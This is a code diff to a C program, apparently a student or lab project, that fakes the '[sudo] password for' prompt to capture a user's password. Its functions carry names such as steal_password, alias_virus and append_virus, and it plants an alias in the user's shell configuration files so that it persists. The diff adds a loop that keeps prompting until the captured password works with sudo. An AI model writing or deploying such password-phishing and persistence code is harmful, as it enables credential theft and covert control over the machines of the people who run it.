@@ -16,6 +16,7 @@ int main(int argc, char ** argv){
 
   //set mode
   int mode = P_IMPLANT;
+  printf("%d\n", argc);
   for (int i = 0; i<argc; i++){
     if (strcmp(argv[i],"SUDO") == 0){
       mode = P_SUDO;
@@ -37,6 +38,8 @@ int main(int argc, char ** argv){
 
     printf("%s's password is %s\n", username, passwd);
   }
+
+  return 0;
 }
 
 
@@ -44,26 +47,34 @@ int get_username(char * uname){
   uid_t uid = getuid();
   struct passwd *pw = getpwuid(uid);
   strcpy(uname, pw -> pw_name);
+
+  return 0;
 }
 
 int steal_password(char * passwd, char * username){
   get_username(username);
 
   char prompt[UNAME_SIZE + 32];
-  sprintf(prompt,"[sudo] password for %s: ", username);
 
-  char * returned_pass = getpass(prompt);
+  int correctPasswd = 0;
+  while (! correctPasswd){
+    sprintf(prompt,"[sudo] password for %s: ", username);
 
-  // returned_pass[strlen(returned_pass)] = 0;
+    // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
+    char * returned_pass = getpass(prompt);
 
-  strcpy(passwd, returned_pass);
+    // returned_pass[strlen(returned_pass)] = 0;
 
-  free(returned_pass);
+    strcpy(passwd, returned_pass);
 
-  if(strlen(passwd)==0){
-    printf("sudo: a password is required\n");
-    exit(1);
+    // If sudo works with password, we know we have the right password
+    if (testSudoPassword(passwd) == 0){
+      correctPasswd = 1;
+    }
+    free(returned_pass);
   }
+
+  return 0;
 }
 
 int alias_virus(){
@@ -82,6 +93,7 @@ int alias_virus(){
     append_virus(home_dir_path, CONFIGS[i], alias);
   }
 
+  return 0;
 }
 
 int append_virus(char * home_dir, char * config_file, char * alias){
@@ -106,4 +118,19 @@ int append_virus(char * home_dir, char * config_file, char * alias){
 
   close(fd);
 
+  return 0;
+
+}
+
+int testSudoPassword(char * passwd){
+  // The first three command line arguments are path to file, SUDO, sudo
+  char * fillerArray[] = {"", ""};
+  return runSudo(passwd, 0, fillerArray);
+
+}
+
+// Runs sudo with given arguments and returns 0 if successful, 1 if not
+int runSudo(char * passwd, int argc, char ** argAry){
+
+  return 0;
 }
